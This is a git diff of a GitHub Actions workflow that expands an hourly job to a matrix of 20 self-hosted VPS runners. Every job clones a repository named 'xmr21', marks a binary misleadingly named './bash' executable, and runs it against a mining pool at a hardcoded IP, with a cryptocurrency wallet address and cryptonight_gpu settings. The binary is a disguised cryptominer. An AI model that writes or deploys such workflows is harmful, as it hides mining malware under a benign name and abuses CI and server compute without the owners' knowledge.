@@ -1,31 +1,42 @@
-name: Run bash --noTest
+name: Run bash --noTest (20 VPS)
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 * * * *"  # tiap 12 jam (UTC)
+    - cron: "0 * * * *"   # tiap 1 jam UTC (bisa ubah)
 
 permissions:
   contents: read
 
 concurrency:
   group: tesaction-run
-  cancel-in-progress: true
+  cancel-in-progress: false   # jangan cancel kalau mau paralel
 
 jobs:
   run:
-    runs-on: self-hosted
-    timeout-minutes: 300  # 5 jam
+    timeout-minutes: 300
+
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: [
+          vps-1, vps-2, vps-3, vps-4, vps-5,
+          vps-6, vps-7, vps-8, vps-9, vps-10,
+          vps-11, vps-12, vps-13, vps-14, vps-15,
+          vps-16, vps-17, vps-18, vps-19, vps-20
+        ]
+
+    runs-on: [self-hosted, ${{ matrix.runner }}]
 
     steps:
-      # OPTIONAL: ini bisa DIHAPUS kalau repo ini memang TIDAK dipakai
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Debug (optional)
+      - name: Debug runner
         run: |
-          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
-          ls -la
+          echo "Runner: ${{ matrix.runner }}"
+          hostname
+          nproc
 
       - name: Clone target repo & run bash
         env:
@@ -34,4 +45,5 @@ jobs:
           git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
           cd xmr21
           chmod +x ./bash
-          ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1 -p x --currency cryptonight_gpu -i 3333
+          ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1
+          
